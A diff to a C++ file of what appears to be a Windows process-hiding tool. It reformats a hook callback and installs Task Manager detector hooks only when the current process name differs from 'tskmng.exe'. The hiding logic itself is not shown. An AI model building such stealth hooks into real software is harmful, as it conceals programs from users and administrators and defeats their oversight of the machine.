@@ -1,27 +1,24 @@
 #include "stdafx.h"
 #include "ProcessHideHooks.h"
 #include "TaskManagerDetector.h"
+#include "Utils.h"
 
 extern HMODULE hCurrentModule;
 HHOOK g_hook = nullptr;
 
-static
-LRESULT
-CALLBACK
-HookProc(
-    int    nCode,
-    WPARAM wParam,
-    LPARAM lParam
-)
+static LRESULT CALLBACK HookProc(int    nCode, WPARAM wParam, LPARAM lParam)
 {
     return CallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
 bool InstallHooks()
 {
-    if (!TaskManagerDetector::GetInstance()->InstallHooks())
+    if (toLowerW(GetCurrentProcessName()).compare(L"tskmng.exe"))
     {
-        return false;
+        if (!TaskManagerDetector::GetInstance()->InstallHooks())
+        {
+            return false;
+        }
     }
 
     return true;
